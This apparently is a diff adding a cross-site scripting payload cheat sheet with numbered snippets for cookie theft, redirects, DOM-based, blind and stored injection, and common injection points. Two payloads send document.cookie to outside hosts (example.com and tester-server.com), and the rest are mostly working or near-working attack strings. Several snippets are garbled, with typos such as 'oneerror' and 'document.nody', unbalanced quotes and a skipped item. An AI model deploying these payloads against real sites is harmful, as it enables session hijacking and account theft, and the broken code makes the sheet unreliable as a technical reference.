@@ -1,0 +1,89 @@
+Cross-Site by { Daily Investors }
+
+Xss-Message: <script> alert('XSS');</script>
+    Viewer: <ing src=X oneerror=alert('XSS')>
+
+1. Cookies: <script>document.location = "http://example.com/?cookie='+document.cookie;</script>
+
+2. Redirect: <script>document.location = 'http://example.com';</script>
+
+3. Persistence: Java: <script> var xhr = new XMLHttpRequest();
+                        xhr.open("GET", "/secret_page.php");
+                        xhr.onload = function() {
+                          if (xhr.status === 200) {
+                            alert(xhr.responseText);
+                            }
+                          };
+                        xhr.send(); </script>
+
+4. Dom Based: <script> var userinput = document.getElementById("user_input").value;
+                       var scriptTag = document.createElement("script");
+                       scriptTag.innerHTML = userInput;
+
+                       document.body.appendChild(scriptTag);
+              </script>
+
+5. Self-Xss: <input type="text" value="</script>"
+
+6. HTML5: <script> localStorage.setItem("xss","<script?alert('XSS')</script>";
+                   alert(localStorage.getItem("xss")); </script>
+
+8. Blind: <script> var xhr = new XMLHttpRequest();
+                     xhr.open("GET", http://tester-server.com/?cookie=" + document.cookie);
+                     xhr.send();
+          </script>
+
+9. Dom with Events: <a href="#" onclick="alert(document.cookie)">Click me</a>
+
+10. JSON Hijacking: 
+<script> 
+var xhr = new XMLHttpRequest();
+  xhr.open("GET", "/vulnerable_endpoint");
+  xhr.onload = function() {
+    var data = JSON.parse(xhr.responseText);
+      //Code Here
+    };
+  xhr.send();
+</script>
+
+11. Common Ways to Inject
+URl Parameters: http://example.com/search?query=<script>alert('XSS')</script>
+
+HTML Forms
+<input type="text" name="username" value="<script>alert('XSS')</script>
+
+HTTP Headers
+User-Agent: <script>alert('XSS')</script>
+
+JSON Data: {"name":
+           "<script>alert('XSS')</script>
+
+12. Basic 
+<div> 
+  <script?alert'1'</script>
+
+13. <div attr="$varUnsafe"> <div attr="*x" onblur="alert(1)*">
+
+
+14. Write
+<script> document.write("Hello, world!");</script>
+
+15. Vuln
+<style> 
+selector { property : $varUnsafe; } </style>
+selector { property: "$varUnsafe";}
+</style>
+<span style="property: $varUnsafe">Oh no</span>
+
+16. Dom Vuln
+<script>
+var x = '<%;
+  var d = document.createElement('div;;
+  d.innerHTML =x;
+
+document.nody.appendChild(d);
+</script>
+  
+
+                       
+ 
